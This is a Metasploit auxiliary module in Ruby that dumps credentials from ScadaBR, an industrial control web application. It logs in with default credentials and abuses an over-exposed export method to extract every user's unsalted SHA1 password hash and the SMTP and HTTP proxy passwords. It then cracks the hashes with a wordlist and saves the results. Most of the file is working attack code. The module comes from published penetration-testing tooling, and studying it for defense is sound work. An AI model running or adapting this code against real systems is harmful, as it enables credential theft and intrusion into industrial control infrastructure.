##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ScadaBR Credentials Dumper',
      'Description'    => %q{
        This module retrieves credentials from ScadaBR, including
        service credentials and unsalted SHA1 password hashes for
        all users, by invoking the 'EmportDwr.createExportData' DWR
        method of Mango M2M which is exposed to all authenticated
        users regardless of privilege level.

        This module has been tested successfully with ScadaBR
        versions 1.0 CE and 0.9 on Windows and Ubuntu systems.
      },
      'Author'         => 'bcoles',
      'License'        => MSF_LICENSE,
      'References'     => ['URL', 'http://www.scadabr.com.br/?q=node/1375'],
      'Targets'        => [[ 'Automatic', {} ]],
      'DisclosureDate' => 'May 28 2017'))
    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('USERNAME',  [ true, 'The username for the application', 'admin' ]),
        OptString.new('PASSWORD',  [ true, 'The password for the application', 'admin' ]),
        OptString.new('TARGETURI', [ true, 'The base path to ScadaBR', '/ScadaBR' ]),
        OptPath.new('PASS_FILE',   [ false, 'Wordlist file to crack password hashes',
          File.join(Msf::Config.data_directory, 'wordlists', 'unix_passwords.txt') ])
      ])
  end

  def login(user, pass)
    res = send_request_cgi 'uri'       => normalize_uri(target_uri.path, 'login.htm'),
                           'method'    => 'POST',
                           'cookie'    => "JSESSIONID=#{Rex::Text.rand_text_hex(32)}",
                           'vars_post' => { 'username' => Rex::Text.uri_encode(user, 'hex-normal'),
                                            'password' => Rex::Text.uri_encode(pass, 'hex-normal') }

    unless res
      fail_with Failure::Unreachable, "#{peer} Connection failed"
    end

    if res.code == 302 && res.headers['location'] !~ /login\.htm/ && res.get_cookies =~ /JSESSIONID=([^;]+);/
      @cookie = res.get_cookies.scan(/JSESSIONID=([^;]+);/).flatten.first
      print_good "#{peer} Authenticated successfully as '#{user}'"
    else
      fail_with Failure::NoAccess, "#{peer} Authentication failed"
    end
  end

  def export_data
    params = 'callCount=1',
             "page=#{target_uri.path}/emport.shtm",
             "httpSessionId=#{@cookie}",
             "scriptSessionId=#{Rex::Text.rand_text_hex(32)}",
             'c0-scriptName=EmportDwr',
             'c0-methodName=createExportData',
             'c0-id=0',
             'c0-param0=string:3',
             'c0-param1=boolean:true',
             'c0-param2=boolean:true',
             'c0-param3=boolean:true',
             'c0-param4=boolean:true',
             'c0-param5=boolean:true',
             'c0-param6=boolean:true',
             'c0-param7=boolean:true',
             'c0-param8=boolean:true',
             'c0-param9=boolean:true',
             'c0-param10=boolean:true',
             'c0-param11=boolean:true',
             'c0-param12=boolean:true',
             'c0-param13=boolean:true',
             'c0-param14=boolean:true',
             'c0-param15=boolean:true',
             'c0-param16=string:100',
             'c0-param17=boolean:true',
             'batchId=1'

    uri = normalize_uri target_uri.path, 'dwr/call/plaincall/EmportDwr.createExportData.dwr'
    res = send_request_cgi 'uri'    => uri,
                           'method' => 'POST',
                           'cookie' => "JSESSIONID=#{@cookie}",
                           'ctype'  => 'text/plain',
                           'data'   => params.join("\n")

    unless res
      fail_with Failure::Unreachable, "#{peer} Connection failed"
    end

    unless res.body =~ /dwr.engine._remoteHandleCallback/
      fail_with Failure::UnexpectedReply, "#{peer} Export failed"
    end

    config_data = res.body.scan(/dwr.engine._remoteHandleCallback\('\d*','\d*',"(.+)"\);/).flatten.first
    print_good "#{peer} Export successful (#{config_data.length} bytes)"

    begin
      return JSON.parse(config_data.gsub(/\\r\\n/, '').gsub(/\\"/, '"'))
    rescue
      fail_with(Failure::UnexpectedReply, "#{peer} Could not parse exported settings as JSON.")
    end
  end

  def load_wordlist(wordlist)
    return unless File.exist? wordlist
    File.open(wordlist, 'rb').each_line do |line|
      @wordlist << line.chomp
    end
  end

  def crack(user, hash)
    return user if hash.eql? Rex::Text.sha1 user
    pass = nil
    @wordlist.each do |word|
      if hash.eql? Rex::Text.sha1 word
        pass = word
        break
      end
    end
    pass
  end

  def run
    login datastore['USERNAME'], datastore['PASSWORD']

    json = export_data

    service_data = { address:      rhost,
                     port:         rport,
                     service_name: (ssl ? 'https' : 'http'),
                     protocol:     'tcp',
                     workspace_id: myworkspace_id }

    columns = 'Username', 'Password', 'Hash (SHA1)', 'Admin', 'E-mail'
    user_cred_table = Rex::Text::Table.new 'Header'  => 'ScadaBR User Credentials',
                                           'Indent'  => 1,
                                           'Columns' => columns

    if json['users'].empty?
      print_error 'Found no user data'
    else
      print_good "Found #{json['users'].length} users"
      @wordlist = *'0'..'9', *'A'..'Z', *'a'..'z'
      @wordlist.concat(['12345', 'admin', 'password', 'scada', 'scadabr'])
      load_wordlist datastore['PASS_FILE'] unless datastore['PASS_FILE'].nil?
    end

    json['users'].each do |user|
      next if user['username'].eql?('')

      username = user['username']
      admin = user['admin']
      mail = user['email']
      hash = Rex::Text.decode_base64(user['password']).unpack('H*').flatten.first
      pass = crack username, hash
      user_cred_table << [username, pass, hash, admin, mail]

      if pass
        print_status "Found weak credentials (#{username}:#{pass})"
        creds = { origin_type:     :service,
                  module_fullname: fullname,
                  private_type:    :password,
                  private_data:    pass,
                  username:        user }
      else
        creds = { origin_type:     :service,
                  module_fullname: fullname,
                  private_type:    :nonreplayable_hash,
                  private_data:    hash,
                  username:        user }
      end

      creds.merge! service_data
      credential_core = create_credential creds
      login_data = { core: credential_core,
                     access_level: (admin ? 'Admin' : 'User'),
                     status: Metasploit::Model::Login::Status::UNTRIED }
      login_data.merge! service_data
      create_credential_login login_data
    end

    columns = 'Service', 'Host', 'Port', 'Username', 'Password'
    service_cred_table = Rex::Text::Table.new 'Header'  => 'ScadaBR Service Credentials',
                                              'Indent'  => 1,
                                              'Columns' => columns

    system_settings = json['systemSettings'].first

    unless system_settings['emailSmtpHost'].eql?('') || system_settings['emailSmtpUsername'].eql?('')
      smtp_host = system_settings['emailSmtpHost']
      smtp_port = system_settings['emailSmtpPort']
      smtp_user = system_settings['emailSmtpUsername']
      smtp_pass = system_settings['emailSmtpPassword']
      vprint_good "Found SMTP credentials: #{smtp_user}:#{smtp_pass}@#{smtp_host}:#{smtp_port}"
      service_cred_table << ['SMTP', smtp_host, smtp_port, smtp_user, smtp_pass]
    end

    unless system_settings['httpClientProxyServer'].eql?('') || system_settings['httpClientProxyUsername'].eql?('')
      proxy_host = system_settings['httpClientProxyServer']
      proxy_port = system_settings['httpClientProxyPort']
      proxy_user = system_settings['httpClientProxyUsername']
      proxy_pass = system_settings['httpClientProxyPassword']
      vprint_good "Found HTTP proxy credentials: #{proxy_user}:#{proxy_pass}@#{proxy_host}:#{proxy_port}"
      service_cred_table << ['HTTP proxy', proxy_host, proxy_port, proxy_user, proxy_pass]
    end

    print_line
    print_line user_cred_table.to_s
    print_line
    print_line service_cred_table.to_s

    path = store_loot 'scadabr.config', 'text/plain', rhost, json, 'ScadaBR configuration settings'
    print_good "Config saved in: #{path}"
  end
end
